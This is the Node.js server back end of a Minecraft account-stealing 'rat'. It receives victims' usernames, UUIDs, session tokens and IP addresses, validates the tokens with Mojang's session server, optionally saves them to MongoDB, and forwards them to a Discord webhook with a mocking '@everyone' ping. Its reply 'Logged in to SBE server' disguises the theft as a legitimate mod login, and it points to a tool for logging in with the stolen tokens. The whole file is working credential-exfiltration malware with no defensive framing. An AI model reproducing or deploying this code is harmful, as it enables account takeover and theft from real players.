//config params
const
    usingDiscord = true,
    usingMongoDB = false

//setup
require('dotenv').config()
const { post } = require("axios").default,
    express = require("express"),
    mongoose = require("mongoose"),
    helmet = require("helmet"),
    app = express(),
    Ratted = require("./models/Ratted"),
    port = process.env.PORT || 80

//plugins
app.use(helmet()) //secure
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
if (usingMongoDB) {
    mongoose.connect(process.env.DB)
    mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"))
    mongoose.connection.on("err", err => console.error(`Mongoose connection error:\n${err.stack}`))
    mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"))
}

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip) return console.log("Invalid post request")

    //validate the token with mojang (should mostly always hit, unless someone sends well formatted json but with bad data)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            'Content-Type': 'application/json'
        }
    })

    .then(response => {
        if (response.status == 204) { //mojangs way of saying its good
            if (usingMongoDB) {
                //create a Ratted object with mongoose schema and save it
                new Ratted({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    ip: req.body.ip,
                    timestamp: new Date(),

                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                    Token: `${req.body.username}:${req.body.uuid}:${req.body.token}`
                }).save(err => {
                    if (err) console.log(`Error while saving to database\n${err}`)
                })
            }

            if (usingDiscord) {
                //send to discord webhook
                post(process.env.WEBHOOK, JSON.stringify({
                    content: "||@everyone|| Bozo", //ping
                    embeds: [{
                        title: `${req.body.username}`,
                        description: `**UUID **\`\`\`${req.body.uuid}\`\`\`\n**IP**\`\`\`${req.body.ip}\`\`\`\n**Token**\`\`\`${req.body.token}:${req.body.uuid}\`\`\``,
                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                        color: 12345,
                        footer: {
                            "text": "Monkey has been beamed by Reaperr#8584",
                            "icon_url": "https://cdn.discordapp.com/attachments/999409582591987853/999704233328779345/static_2.png"
                        },
                        timestamp: new Date()
                    }],
                    attachments: []
                }), {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }).catch(err => {
                    console.log(`Error while sending to webhook\n${err}`)
                })
            }

            console.log(`${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
        }
    })

    .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`Error checking data with mojang\n${err}`)
    })

    //change this to whatever u want, but make sure to send a response
    res.send("Logged in to SBE server")
})

//create server
app.listen(port, () => console.log(`Listening at port ${port}`))

//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}